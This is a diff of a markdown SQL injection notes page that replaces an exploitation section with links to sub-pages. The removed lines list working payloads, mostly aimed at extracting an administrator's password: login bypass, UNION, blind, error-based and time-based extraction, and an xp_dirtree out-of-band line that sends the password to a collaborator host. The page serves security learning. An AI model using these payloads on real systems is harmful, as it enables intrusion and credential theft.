@@ -1,6 +1,6 @@
 # SQL Injection
 
-## Overview
+## What is SQL Injection?
 
 SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. Attackers can manipulate queries to read, modify, or delete data, bypass authentication, or execute administrative operations on the database.
 
@@ -22,116 +22,14 @@ SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities
 - Observe differences in application behavior for TRUE vs FALSE conditions in blind scenarios.
 - Check error messages when syntax is valid vs invalid.
 
-## Exploitation
+## Exploits
 
-### Login Bypass
-
-Simple authentication bypass:
-```
-administrator'--
-```
-
-### UNION-Based SQLi
-
-**Determine number of columns:**
-```sql
-' ORDER BY 1--
-' ORDER BY 2--
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-```
-
-**Oracle note:** Requires `FROM` clause:
-```sql
-' UNION SELECT NULL FROM DUAL--
-```
-
-**Finding useful columns:**
-```sql
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-```
-
-**Retrieving data:**
-```sql
-' UNION SELECT username, password, NULL FROM users--
-' UNION SELECT username || '~' || password FROM users--
-```
-
-**Database enumeration:**
-- Version: `' UNION SELECT @@version--`
-- Tables: `SELECT * FROM information_schema.tables`
-- Columns: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
-
-### Blind SQLi
-
-**Detection:**
-```sql
-' AND '1'='1
-' AND '1'='2
-```
-
-**Exploitation (length and char extraction):**
-```sql
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
-' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
-' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
-```
-
-### Error-Based SQLi
-
-Trigger errors to leak data:
-```sql
-xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-```
-
-MySQL example:
-```sql
-xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
-```
-
-Oracle:
-```sql
-TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' --
-```
-
-CAST technique:
-```sql
-' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-```
-
-### Time-Based Blind
-
-**Detection:**
-```sql
-'; IF (1=1) WAITFOR DELAY '0:0:10'--
-```
-
-**Exploitation:**
-```sql
-'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
-```
-
-Postgres:
-```sql
-%3BSELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
-```
-
-### OAST (Out-of-Band) Techniques
-
-Trigger DNS/HTTP callbacks to confirm and exfiltrate:
-- Microsoft SQL: `'; exec master..xp_dirtree '//collaborator.example.com/a'--`
-- More advanced UNION + XML extraction for data exfil.
-
-Example for password exfil:
-```sql
-'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.collaborator.net/a"')--
-```
-
-### Other Techniques
-
-- Bypass filters using XML or encoded payloads (e.g., `&#x55;NION`).
-- Second-order SQLi: injection is stored and executed later in a different context.
+- [Login Bypass](sql-injection/login-bypass.md)
+- [UNION-Based SQLi](sql-injection/union-based.md)
+- [Blind SQLi](sql-injection/blind.md)
+- [Error-Based SQLi](sql-injection/error-based.md)
+- [Time-Based Blind SQLi](sql-injection/time-based.md)
+- [OAST (Out-of-Band) SQLi](sql-injection/oast.md)
 
 ## Impact
 
